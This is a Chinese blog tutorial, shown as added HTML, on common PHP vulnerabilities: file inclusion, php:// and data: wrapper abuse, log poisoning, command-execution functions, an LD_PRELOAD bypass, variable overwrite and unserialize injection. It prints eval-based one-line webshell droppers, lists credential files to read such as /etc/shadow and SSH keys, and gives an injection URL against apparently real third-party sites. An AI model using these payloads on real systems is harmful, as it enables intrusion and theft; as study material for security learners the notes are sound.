@@ -1,0 +1,644 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || php常见的相关漏洞</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>php<hanla></hanla>常见的相关漏洞 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/10/1
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/php常见漏洞">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                php<hanla></hanla>常见漏洞
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>  <span id="more"></span>
+
+<p> 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，<br>而无需再次编写，这中文件调用的过程一般被称为文件包含。<br>  程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，<br>但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br><hanla></hanla>  几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在<hanla></hanla>PHP Web Application<hanla></hanla>中居多,<br><hanla></hanla>而在<hanla></hanla>JSP、ASP、ASP.NET<hanla></hanla>程序中却非常少，甚至没有，这是有些语言设计的弊端。<br><hanla></hanla>  在<hanla></hanla>PHP<hanla></hanla>中经常出现包含漏洞，但这并不意味这其他语言不存在。</p>
+<pre><code><hanla></hanla>include 'conn.php'
+require 'config.php'
+include_once
+require_once
+
+$file=$_GET['file']
+include $file
+index.php?file=/uploadfile/2020123123.jpg
+
+include()：执行到<hanla></hanla>include<hanla></hanla>时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
+require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
+include_once()<hanla></hanla>和<hanla></hanla>require_once()：若文件中代码已被包含则不会再次包含
+</code></pre>
+<p>利用条件<br><hanla></hanla>程序用<hanla></hanla>include()<hanla></hanla>等文件包含函数通过动态变量的范式引入需要包含的文件<br>用户能够控制该动态变量  </p>
+<p>漏洞危害<br>执行任意代码<br>包含恶意文件控制网站<br>甚至控制服务器  </p>
+<p>本地文件包含：<br>可以包含本地文件，在条件允许时甚至能执行代码<br>    上传图片马，然后包含<br><hanla></hanla>    读敏感文件，读<hanla></hanla>PHP<hanla></hanla>文件<br><hanla></hanla>    包含日志文件<hanla></hanla>GetShell</p>
+<p><hanla></hanla>包含<hanla></hanla>/proc/self/envion<hanla></hanla>文件<hanla></hanla>GetShell<br><hanla></hanla>    包含<hanla></hanla>data:<hanla></hanla>或<hanla></hanla>php://input<hanla></hanla>等伪协议</p>
+<p><hanla></hanla>若有<hanla></hanla>phpinfo<hanla></hanla>则可以包含临时文件<br>远程文件包含：可以直接执行任意代码<br><hanla></hanla>    要保证<hanla></hanla>php.ini<hanla></hanla>中<hanla></hanla>allow_url_fopen<hanla></hanla>和<hanla></hanla>allow_url_include<hanla></hanla>要为<hanla></hanla>On</p>
+<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>通过白盒代码审计<br>黑盒工具挖掘<br><hanla></hanla>awvs appscan burp<br>w3af<br>file include 文件包含（有漏洞会报这个，高危）</p>
+<p>手工挖掘不建议<br><hanla></hanla>1.<hanla></hanla>考虑参数存在的漏洞<br><hanla></hanla>2.<hanla></hanla>路径查找<br><hanla></hanla>3.<hanla></hanla>附加后缀截断<br><hanla></hanla>%00<br><hanla></hanla>文件附加名./././././././.php<br>/etc/passwd<br><hanla></hanla>找一个系统可以访问的文件作为判断依据<br><hanla></hanla>index.php?m=index&amp;sid=123&amp;sjfsdf=<br>index.php?m=../../../../etc/passwd&amp;sid=123&amp;sjfsdf=</p>
+<p><hanla></hanla>白盒审计可以直接搜<hanla></hanla>include  和 require<hanla></hanla>函数，看后面有没有变量</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><pre><code><hanla></hanla>文件包含漏洞利用的条件
+1 include()<hanla></hanla>等函数通过动态变量的方式引入需要包含的文件
+2 用户能控制该动态变量
+<!--?php 
+$test=$_GET['c'];
+include($test);
+?-->
+保存为 include.php
+在同一个目录下创建<hanla></hanla>test.txt 
+内容为
+<!--?php phpinfo() ?-->
+访问测试  
+//http://127.0.0.1/test/include.php?c=test.txt   
+ //<hanla></hanla>访问连接，将<hanla></hanla>123.txt<hanla></hanla>传送给<hanla></hanla>c<hanla></hanla>并赋给<hanla></hanla>test<hanla></hanla>变量
+
+有读取权限可以用<hanla></hanla>a<hanla></hanla>站的文件包含，去包含<hanla></hanla>b<hanla></hanla>站上传的马
+
+菜刀连接
+http://www.baidu.com/a.php?c=/uploadfile/x.jpg
+密码是一样的，
+或者在这个文件新生成一个文件，连接<hanla></hanla>b.php<hanla></hanla>就行了
+b.php
+
+本地文件包含注意事项
+对你包含的文件后面添加了一个.php
+相对路径
+../../../etc/passwd
+%00<hanla></hanla>截断包含<hanla></hanla>(PHP&lt;5.3.4)
+<!--?php
+     
+ include $_GET[x].'.php';
+    
+echo $_GET[x].'.php';
+?-->
+magic_quotes_gps=off 才可以，否则<hanla></hanla>%00<hanla></hanla>会被转义
+</code></pre>
+<p>这个截断我没有测试成功</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImyhLS"><img src="https://s3.jpg.cm/2021/10/01/ImyhLS.png" alt="ImyhLS.png"></a></p>
+<p>利用技巧</p>
+<pre><code><hanla></hanla>上传图片马，马包含的代码为
+<!--?fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?-->")?&gt;，
+$<hanla></hanla>前面的\是防转义
+上传后图片路径为<hanla></hanla>/uploadfile/x.jpg，
+当访问
+http://www.cracer.com/xx.php?page=uploadfile/x.jpg<hanla></hanla>时，
+将会在<hanla></hanla>fi<hanla></hanla>这个文件夹下生成<hanla></hanla>shell.php,
+内容为<hanla></hanla><!--?php eval($_POST[x); ?-->
+</code></pre>
+<h3 id="读敏感文件"><a href="#读敏感文件" class="headerlink" title="读敏感文件"></a>读敏感文件</h3><pre><code><hanla></hanla>Windows：
+  
+C:\boot.ini  //<hanla></hanla>查看系统版本
+  
+C:\Windows\System32\inetsrv\MetaBase.xml  //IIS<hanla></hanla>配置文件
+  
+C:\Windows\repair\sam  //<hanla></hanla>存储系统初次安装的密码
+ 
+ C:\Program Files\mysql\my.ini  //Mysql<hanla></hanla>配置
+  
+C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
+  
+C:\Windows\php.ini  //php<hanla></hanla>配置信息
+  
+C:\Windows\my.ini  //Mysql<hanla></hanla>配置信息
+
+Linux：
+ 
+ /root/.ssh/authorized_keys
+  
+/root/.ssh/id_rsa
+  
+/root/.ssh/id_ras.keystore
+  
+/root/.ssh/known_hosts
+  
+/etc/passwd
+  
+/etc/shadow
+ 
+/etc/my.cnf
+  
+/etc/httpd/conf/httpd.conf
+  
+/root/.bash_history
+  
+/root/.mysql_history
+  
+/proc/self/fd/fd[0-9]*(文件标识符)
+  
+/proc/mounts
+  
+/porc/config.gz
+</code></pre>
+<h3 id="包含实例"><a href="#包含实例" class="headerlink" title="包含实例"></a>包含实例</h3><p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImyC0h"><img src="https://s3.jpg.cm/2021/10/01/ImyC0h.png" alt="ImyC0h.png"></a></p>
+<p>然后我们制作错误，写入一句话<br>制作错误，写入一句话</p>
+<pre><code>http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Imy3NQ"><img src="https://s3.jpg.cm/2021/10/01/Imy3NQ.png" alt="Imy3NQ.png"></a></p>
+<p>然后在这个路径下就会记录一句话</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImyzjT"><img src="https://s3.jpg.cm/2021/10/01/ImyzjT.png" alt="ImyzjT.png"></a></p>
+<p>然后利用包含漏洞，包含日志</p>
+<pre><code>http://127.0.0.1/ekucms/index.php?s=my/show/id/\..\temp\logs\21_10_01.log
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Imy25E"><img src="https://s3.jpg.cm/2021/10/01/Imy25E.png" alt="Imy25E.png"></a></p>
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><p>网址访问的日志你没有权限访问<br><hanla></hanla>但是<hanla></hanla>cms<hanla></hanla>错误日志可以访问<br>读日志路径：<br><hanla></hanla>文件包含漏洞读取<hanla></hanla>apache<hanla></hanla>配置文件</p>
+<pre><code><hanla></hanla>index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+默认位置<hanla></hanla>/var/log/httpd/access_log
+日志会记录客户端请求及服务器响应的信息，
+访问<hanla></hanla>http://www.xx.com/<!--?php phpinfo(); ?--><hanla></hanla>时，
+<!--?php phpinfo(); ?--><hanla></hanla>也会被记录在日志里，
+也可以插入到<hanla></hanla>User-Agent
+可以通过<hanla></hanla>Burp Suite<hanla></hanla>来绕过编码
+</code></pre>
+<h3 id="读php文件"><a href="#读php文件" class="headerlink" title="读php文件"></a><hanla></hanla>读<hanla></hanla>php<hanla></hanla>文件</h3><p><hanla></hanla>直接包含<hanla></hanla>php<hanla></hanla>文件时会被解析，不能看到源码，可以用封装协议读取：<br>?page=php://filter/read=convert.base64-encode/resource=config.php<br><hanla></hanla>访问上述<hanla></hanla>URL<hanla></hanla>后会返回<hanla></hanla>config.php<hanla></hanla>中经过<hanla></hanla>Base64<hanla></hanla>加密后的字符串，<br>解密即可得到源码</p>
+<h3 id="使用php封装协议"><a href="#使用php封装协议" class="headerlink" title="使用php封装协议"></a><hanla></hanla>使用<hanla></hanla>php<hanla></hanla>封装协议</h3><pre><code><hanla></hanla>allow_url_include=On<hanla></hanla>时,<hanla></hanla>若执行<hanla></hanla>http://www.xxx.com/index.php?page=php://input,<hanla></hanla>并且提
+交数据<hanla></hanla><!--?php fputs(fopen("shell.php","w"),"<?php eval($_POST['xxxser']);?-->") ?&gt;
+</code></pre>
+<p><hanla></hanla>结果将在<hanla></hanla>index.php<hanla></hanla>所在文件下生成一句话文件<hanla></hanla>shell.php</p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><pre><code><hanla></hanla>注：远程的文件名不能为<hanla></hanla>php<hanla></hanla>可解析的扩展名，allow_url_fopen<hanla></hanla>和<hanla></hanla>allow_url_include<hanla></hanla>为<hanla></hanla>On<hanla></hanla>是必须的
+若在<hanla></hanla>a.txt<hanla></hanla>写入
+<!--?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[xxx]); ?-->") ?&gt;，可直接写<hanla></hanla>shell
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImyjbW"><img src="https://s3.jpg.cm/2021/10/01/ImyjbW.png" alt="ImyjbW.png"></a></p>
+<h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><pre><code><hanla></hanla>PHP<hanla></hanla>中可以执行代码的函数。如<hanla></hanla>eval()、assert()、``、system()、exec()、
+shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec() 等
+例如：
+<!--?php eval($_POST[cc123]) ?-->
+
+
+动态代码执行
+<!--?php
+$a = $_GET['a'];
+$b= $_GET['b'];
+$a($b);
+?-->
+ 
+http://127.0.0.1/x.php?a=system&amp;b=ipconfig
+执行系统命令<hanla></hanla>ipconfig
+</code></pre>
+<h3 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h3><p><hanla></hanla>在<hanla></hanla>php<hanla></hanla>中您可以使用下列<hanla></hanla>5<hanla></hanla>个函数来执行外部的应用程序或函数</p>
+<p>1 system：执行一个外部的应用程序并显示输出的结果<br><hanla></hanla>2 exec:<hanla></hanla>执行一个外部的应用程序<br><hanla></hanla>3 passthru:<hanla></hanla>执行一个<hanla></hanla>UNIX<hanla></hanla>系统命令并显示原始的输出<br><hanla></hanla>4 shell_exec:<hanla></hanla>执行<hanla></hanla>shell<hanla></hanla>命令并返回输出的结果的字符串<br><hanla></hanla>5 “’’”<hanla></hanla>运算符：与<hanla></hanla>shell_exec<hanla></hanla>函数的功能相同</p>
+<h4 id="system函数使用"><a href="#system函数使用" class="headerlink" title="system函数使用"></a><hanla></hanla>system<hanla></hanla>函数使用</h4><pre><code><hanla></hanla>&lt;?
+$cmd = $_GET["cmd"];
+echo "&lt;pre&gt;";
+system($cmd);
+echo "&lt;/pre&gt;";
+?&gt;
+http://127.0.0.1/sys.php?cmd=ipconfig
+</code></pre>
+<h4 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a><hanla></hanla>shell_exec<hanla></hanla>函数</h4><pre><code><hanla></hanla>&lt;?php 
+$x=$_GET['x'];
+echo shell_exec($x);
+?&gt;
+
+http://127.0.0.1/x.php?x=ipconfig
+</code></pre>
+<p><hanla></hanla>解决<hanla></hanla>linux<hanla></hanla>禁用执行命令函数的问题<br><hanla></hanla>编写<hanla></hanla>hack.c：</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+ 
+
+void payload() {
+        
+system("rm /tmp/check.txt");
+}   
+
+int  geteuid() 
+{
+if (getenv("LD_PRELOAD") == NULL) 
+{ return 0; }
+unsetenv("LD_PRELOAD");
+payload();
+}
+</code></pre>
+<p>测试执行</p>
+<pre><code><hanla></hanla>$ gcc -c -fPIC hack.c -o hack 
+$ gcc -shared hack -o hack.so
+再上传到<hanla></hanla>webshell<hanla></hanla>上，然后写一段简单的<hanla></hanla>php<hanla></hanla>代码：
+<!--?php
+putenv("LD_PRELOAD=/var/www/hack.so");
+mail("a@localhost","","","","");
+?-->
+</code></pre>
+<p>在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，<br>找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，<br>测试中注意修改为实际路径。</p>
+<p>代码执行 实例<br><a target="_blank" rel="noopener" href="http://www.77dvd.com/"><hanla></hanla>http://www.77dvd.com/</a><br><a target="_blank" rel="noopener" href="http://www.bgdyhd.com/">http://www.bgdyhd.com/</a><br><a target="_blank" rel="noopener" href="http://www.bgdyhd.com/search.php?searchtype=5&amp;tid=&amp;area=phpinfo()">http://www.bgdyhd.com/search.php?searchtype=5&amp;tid=&amp;area=phpinfo()</a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Imyyo2"><img src="https://s3.jpg.cm/2021/10/01/Imyyo2.png" alt="Imyyo2.png"></a></p>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><pre><code><hanla></hanla>变量如果未初始化，且能被用户所控制。
+在<hanla></hanla>php<hanla></hanla>中，若<hanla></hanla>register_globals 为<hanla></hanla>on<hanla></hanla>时尤其严重
+此为全局变量覆盖漏洞
+当<hanla></hanla>register_global=ON<hanla></hanla>时，变量来源可能是各个不同的地方，
+比如页面的表单，Cookie<hanla></hanla>等。
+</code></pre>
+<h4 id="变量覆盖实例"><a href="#变量覆盖实例" class="headerlink" title="变量覆盖实例"></a>变量覆盖实例</h4><pre><code><hanla></hanla>&lt;?php
+  
+$auth = '0';
+  
+extract($_GET);
+if($auth==1)
+{  
+echo "登录成功!";
+  
+}else{  
+echo "您还没有登录，请重新登录!";
+  
+}  
+?&gt; 
+http://127.0.0.1/bian.php?auth=1
+</code></pre>
+<p><hanla></hanla>dedecms<hanla></hanla>变量覆盖或者重装漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImyaVL"><img src="https://s3.jpg.cm/2021/10/01/ImyaVL.png" alt="ImyaVL.png"></a></p>
+<p>但是他可以通过各种方式传值</p>
+<p><hanla></hanla>这里我需要给<hanla></hanla>INSLOCKFILE<hanla></hanla>前面加一个才可以</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Imy9DH"><img src="https://s3.jpg.cm/2021/10/01/Imy9DH.png" alt="Imy9DH.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/ImyiFf"><img src="https://s3.jpg.cm/2021/10/01/ImyiFf.png" alt="ImyiFf.png"></a></p>
+<h3 id="php反序列漏洞"><a href="#php反序列漏洞" class="headerlink" title="php反序列漏洞"></a><hanla></hanla>php<hanla></hanla>反序列漏洞</h3><pre><code><hanla></hanla>php<hanla></hanla>反序列化漏洞，又叫<hanla></hanla>php<hanla></hanla>对象注入漏洞。
+序列化与反序列化
+php<hanla></hanla>中有两个函数<hanla></hanla>serialize() 和<hanla></hanla>unserialize()。
+</code></pre>
+<h4 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h4><pre><code><hanla></hanla>当在<hanla></hanla>php<hanla></hanla>中创建了一个对象后，可以通过<hanla></hanla>serialize()<hanla></hanla>把这个对象转变成一个字符串，
+保存对象的值方便之后的传递与使用。测试代码如下；
+<!--?php
+class chybeta{
+  
+var $test = '123';
+}
+$class1 = new chybeta;
+$class1_ser = serialize($class1);
+print_r($class1_ser);
+?-->
+这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：
+O:7:"chybeta":1:{s:4:"test";s:3:"123";}
+这里的<hanla></hanla>O<hanla></hanla>代表存储的是对象（object）,<hanla></hanla>假如你给<hanla></hanla>serialize()<hanla></hanla>传入的是一个数组，那它会变成字母<hanla></hanla>a。7<hanla></hanla>表示对象的名称有<hanla></hanla>7<hanla></hanla>个字符。
+"chybeta"表示对象的名称。1<hanla></hanla>表示有一个值。{s:4:"test";s:3:"123";}<hanla></hanla>中，
+s<hanla></hanla>表示字符串，4<hanla></hanla>表示该字符串的长度，"test"为字符串的名称，之后的类似。
+</code></pre>
+<h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h4><pre><code><hanla></hanla>
+与 serialize() 对应的，unserialize()<hanla></hanla>可以从已存储的表示中创建<hanla></hanla>PHP<hanla></hanla>的值，单就本次所关心的环境而言，
+可以从序列化后的结果中恢复对象（object）。
+<!--?php
+class chybeta{
+  
+var $test = '123';
+}
+$class2 = 'O:7:"chybeta":1:{s:4:"test";s:3:"123";}';  print_r($class2);
+echo "</br-->";
+$class2_unser = unserialize($class2);
+print_r($class2_ser);
+?&gt;
+这里提醒一下，
+当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。
+</code></pre>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code><hanla></hanla>由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，
+从而控制对象内部的变量甚至是函数。
+利用构造函数等
+Magic function
+php<hanla></hanla>中有一类特殊的方法叫<hanla></hanla>“Magic function”， 这里我们着重关注一下几个：
+构造函数<hanla></hanla>__construct()：当对象创建<hanla></hanla>(new)<hanla></hanla>时会自动调用。但在<hanla></hanla>unserialize()<hanla></hanla>时是不会自动调用的。
+析构函数<hanla></hanla>__destruct()：当对象被销毁时会自动调用。
+__wakeup() ：如前所提，unserialize()<hanla></hanla>时会自动调用。
+
+<!--?php
+class chybeta{
+  
+var $test = '123';
+  
+function __wakeup(){
+    
+echo "__wakeup";
+    
+echo "</br-->";
+  
+}
+  
+function __construct(){
+    
+echo "__construct";
+    
+echo "<br>";
+  
+}
+  
+function __destruct(){
+    
+echo "__destruct";
+    
+echo "<br>";
+  
+}
+}
+$class2 = 'O:7:"chybeta":1:{s:4:"test";s:3:"123";}';
+  
+print_r($class2);
+echo "<br>";
+$class2_unser = unserialize($class2);
+print_r($class2_unser);
+echo "<br>";
+?&gt;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9dSR"><img src="https://s3.jpg.cm/2021/10/01/Im9dSR.png" alt="Im9dSR.png"></a></p>
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p><hanla></hanla>__wakeup() 或<hanla></hanla>__destruct()<br><hanla></hanla>由前可以看到，unserialize()<hanla></hanla>后会导致<hanla></hanla>__wakeup() 或<hanla></hanla>__destruct()<hanla></hanla>的直接调用，中间无需其他过程。<br><hanla></hanla>因此最理想的情况就是一些漏洞<hanla></hanla>/<hanla></hanla>危害代码在<hanla></hanla>__wakeup() 或<hanla></hanla>__destruct()<hanla></hanla>中，<br>从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。<br><hanla></hanla>假设<hanla></hanla>index<hanla></hanla>源码如下：<br><hanla></hanla>同目录下有个空的<hanla></hanla>shell.php<hanla></hanla>文件。<br><hanla></hanla>一开始访问<hanla></hanla>index.php。</p>
+<pre><code><hanla></hanla><!--?php
+class chybeta{
+  
+var $test = '123';
+  
+function __wakeup(){
+    
+$fp = fopen("shell.php","w") ;
+    
+fwrite($fp,$this--->test);
+    
+fclose($fp);
+  }
+}
+$class3 = $_GET['test'];
+print_r($class3);
+echo "";
+$class3_unser = unserialize($class3);
+require "shell.php";
+// 为显示效果，把这个<hanla></hanla>shell.php<hanla></hanla>包含进来
+?&gt;
+
+基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。
+通过源代码知，把对象中的<hanla></hanla>test<hanla></hanla>值赋为 “<!--?php phpinfo(); ?-->”,<hanla></hanla>再调用<hanla></hanla>unserialize()<hanla></hanla>时会通过<hanla></hanla>__wakeup()<hanla></hanla>把<hanla></hanla>test<hanla></hanla>的写入到<hanla></hanla>shell.php<hanla></hanla>中。
+为此我们写个<hanla></hanla>php<hanla></hanla>脚本：
+<!--?php
+class chybeta{
+  
+var $test = '123';
+  
+function __wakeup(){
+    
+$fp = fopen("shell.php","w") ;
+    
+fwrite($fp,$this--->test);
+    
+fclose($fp);
+  
+}
+}
+$class4 = new chybeta();
+$class4-&gt;test = "<!--?php phpinfo(); ?-->";  
+$class4_ser = serialize($class4); 
+print_r($class4_ser);
+?&gt;
+由此得到序列化结果：
+O:7:"chybeta":1:{s:4:"test";s:19:"<!--?php phpinfo(); ?-->";}
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9Q7t"><img src="https://s3.jpg.cm/2021/10/01/Im9Q7t.png" alt="Im9Q7t.png"></a></p>
+<h3 id="php-—-访问各个输入-输出流"><a href="#php-—-访问各个输入-输出流" class="headerlink" title="php:// — 访问各个输入/输出流"></a><hanla></hanla>php:// — 访问各个输入<hanla></hanla>/<hanla></hanla>输出流</h3><p><hanla></hanla>PHP 提供了一些杂项输入<hanla></hanla>/<hanla></hanla>输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br> 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<pre><code>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，
+最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。
+ 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，
+ 比激活 always_populate_raw_post_data 潜在需要更少的内存。 
+enctype="multipart/form-data" 的时候 php://input 是无效的。
+</code></pre>
+<h3 id="php-input将文件包含漏洞变成代码执行漏洞"><a href="#php-input将文件包含漏洞变成代码执行漏洞" class="headerlink" title="php://input将文件包含漏洞变成代码执行漏洞"></a><hanla></hanla>php://input<hanla></hanla>将文件包含漏洞变成代码执行漏洞</h3><pre><code><hanla></hanla>文件中存在包含漏洞的代码
+<!--?php @include($_GET["file"])?-->
+使用<hanla></hanla>php://input，将执行代码通过<hanla></hanla>Firefox 的<hanla></hanla>hackbar 在<hanla></hanla>POST data<hanla></hanla>中提交
+<!--?php system('ifconfig');?-->
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9nk5"><img src="https://s3.jpg.cm/2021/10/01/Im9nk5.png" alt="Im9nk5.png"></a></p>
+<h3 id="利用php-input可以直接post传参"><a href="#利用php-input可以直接post传参" class="headerlink" title="利用php://input可以直接post传参"></a><hanla></hanla>利用<hanla></hanla>php://input<hanla></hanla>可以直接<hanla></hanla>post<hanla></hanla>传参</h3><pre><code><hanla></hanla><!--?php $data = file_get_contents('php://input'); eval($data); ?-->
+(注意：需要<hanla></hanla>allow_url_include = On 且 PHP &gt;= 5.2.0)
+</code></pre>
+<h3 id="data-URL代码执行"><a href="#data-URL代码执行" class="headerlink" title="data URL代码执行"></a><hanla></hanla>data URL<hanla></hanla>代码执行</h3><p><hanla></hanla>我们可以将攻击代码转换为<hanla></hanla>data:URL<hanla></hanla>形式进行攻击，但是直接在<hanla></hanla>URL<hanla></hanla>连接中出现一些敏感字符，<br><hanla></hanla>会导致被<hanla></hanla>waf<hanla></hanla>检测，所以我们需要给攻击代码进行<hanla></hanla>base64<hanla></hanla>编码。</p>
+<pre><code><hanla></hanla><!--?php include $_GET['file']?-->   保存为<hanla></hanla>c.php
+127.0.0.1/c.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9WVr"><img src="https://s3.jpg.cm/2021/10/01/Im9WVr.png" alt="Im9WVr.png"></a></p>
+<p><hanla></hanla>php://filter<hanla></hanla>在文件包含漏洞中的利用<br><hanla></hanla>读取<hanla></hanla>php<hanla></hanla>文件源码内容<br>用法：<br>php://filter/read=convert.base64-encode/resource=［文件路径］<br><hanla></hanla>将得到的<hanla></hanla>base64<hanla></hanla>的数据解码得出<hanla></hanla>php<hanla></hanla>文件内容  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im95yC"><img src="https://s3.jpg.cm/2021/10/01/Im95yC.png" alt="Im95yC.png"></a></p>
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><pre><code><hanla></hanla><!--?php
+$file = $_GET['file'];
+include($file.'.jpg');
+?-->
+上面的代码一个验证了后缀是否为<hanla></hanla>jpg，一个是直接添加了<hanla></hanla>jpg<hanla></hanla>后缀，然后才包含。对于现在这种情况，要包含<hanla></hanla>php<hanla></hanla>文件的话的，可以通过截断。但是\x00<hanla></hanla>的截断在<hanla></hanla>php&gt;5.3.4<hanla></hanla>就没用了，而且还要考虑<hanla></hanla>GPC,<hanla></hanla>所以是比较鸡肋的方法。其实我们可以通过<hanla></hanla>zip<hanla></hanla>协议和<hanla></hanla>phar<hanla></hanla>协议来包含文件。
+首先我们新建一个<hanla></hanla>zip<hanla></hanla>文件，里面压缩着一个<hanla></hanla>php<hanla></hanla>脚本。
+然后我们构造<hanla></hanla>zip://php.zip#php.jpg
